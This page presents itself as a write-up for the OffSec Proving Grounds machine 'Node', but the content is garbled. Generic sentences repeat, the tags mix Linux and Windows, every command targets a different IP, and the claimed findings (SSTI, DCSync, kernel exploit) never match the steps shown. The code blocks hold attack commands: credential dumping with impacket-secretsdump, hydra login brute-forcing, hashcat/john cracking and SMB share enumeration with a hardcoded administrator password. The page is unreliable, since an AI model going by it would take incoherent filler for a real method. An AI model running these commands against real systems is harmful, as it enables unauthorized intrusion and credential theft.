---
TitleSEO: "OffSec Proving Grounds — Node (Medium Linux) | ZureFX"
TitlePost: "OffSec Proving Grounds — Node (Medium Linux)"
Author: "ZureFX"
Description: "Full writeup for OffSec Proving Grounds Node. AS-REP Roasting and DCSync to achieve medium compromise on Linux."
Keywords: "active directory, medium, tryhackme, easy, linux, windows, offsec"
URL: "https://zurefx.github.io/writeups/htb-node-516.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-node-516/"
Date: "2024-01-08"
Tags: "Active Directory, Medium, TryHackMe, Easy, Linux, Windows, OffSec"
Section: "writeups"
Lang: "en"
main_img: "htb-node-516"
Permalink: "/writeups/htb-node-516.html"
BtnLabel: "Read Writeup"
Pick: 0
---
## Machine Info

### Overview

The target **Node** is rated **Medium** on OffSec Proving Grounds. It runs **Linux** and the IP address during this analysis was `10.57.237.248`.

### Objectives

Post-exploitation enumeration revealed a path to domain administrator privileges. The backup files contained sensitive information that should not have been accessible.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
evil-winrm -i 10.76.226.51 -u administrator -p 'P@ssw0rd!'
nmap -sCV -p135,8443,1433 10.29.49.66 -oN scan.txt
```

Privilege escalation was possible due to misconfigured sudo permissions. The application stored sensitive credentials in an unencrypted configuration file.

### Service Enumeration

Authentication bypass was achieved through careful manipulation of the login mechanism. Post-exploitation enumeration revealed a path to domain administrator privileges. The service account had excessive permissions assigned in Active Directory.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
crackmapexec smb 10.123.45.222 -u administrator -p 'P@ssw0rd!' --shares
crackmapexec smb 10.83.140.22 -u administrator -p 'P@ssw0rd!' --shares
impacket-secretsdump administrator:'P@ssw0rd!'@10.39.1.97
```

Post-exploitation enumeration revealed a path to domain administrator privileges. The kernel version was outdated and vulnerable to a publicly known exploit.

### SMB Enumeration

The service was running without proper input validation, leading to injection vulnerabilities. The service was running without proper input validation, leading to injection vulnerabilities.

```bash
nmap -sCV -p3389,80,5432 10.15.168.167 -oN scan.txt
impacket-secretsdump administrator:'P@ssw0rd!'@10.28.131.5
```

The web application was vulnerable to Server-Side Template Injection (SSTI). The application stored sensitive credentials in an unencrypted configuration file. The kernel version was outdated and vulnerable to a publicly known exploit.

## Exploitation

### Vulnerability Identification

Weak file permissions allowed modification of critical system files. Weak file permissions allowed modification of critical system files. The web application was vulnerable to Server-Side Template Injection (SSTI).

Key finding: **DCSync**.

The database credentials were hardcoded in the application source code. The scheduled task ran with elevated privileges and could be abused for escalation.

### Initial Access

Initial enumeration revealed several interesting open ports on the target. Post-exploitation enumeration revealed a path to domain administrator privileges.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.37.133.184 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

The backup files contained sensitive information that should not have been accessible. Weak file permissions allowed modification of critical system files. Group Policy Preferences contained encrypted but recoverable credentials.

## Privilege Escalation

### Enumeration

Network traffic analysis revealed unencrypted communications containing user credentials. The kernel version was outdated and vulnerable to a publicly known exploit. Lateral movement was facilitated by reusing discovered credentials across services.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

### Exploitation

The service account had excessive permissions assigned in Active Directory. Post-exploitation enumeration revealed a path to domain administrator privileges.

```bash
gobuster dir -u http://10.14.2.92/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
gobuster dir -u http://10.21.35.249/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

Group Policy Preferences contained encrypted but recoverable credentials. Weak file permissions allowed modification of critical system files.

### Root/SYSTEM

Successfully obtained **root** access on the target.

The service was running without proper input validation, leading to injection vulnerabilities. Initial enumeration revealed several interesting open ports on the target.

## Summary

### Tools Used

- `kerbrute`
- `nikto`
- `burpsuite`
- `feroxbuster`
- `enum4linux`
- `nmap`
- `dcomexec`

### Key Takeaways

- AS-REP Roasting
- DCSync
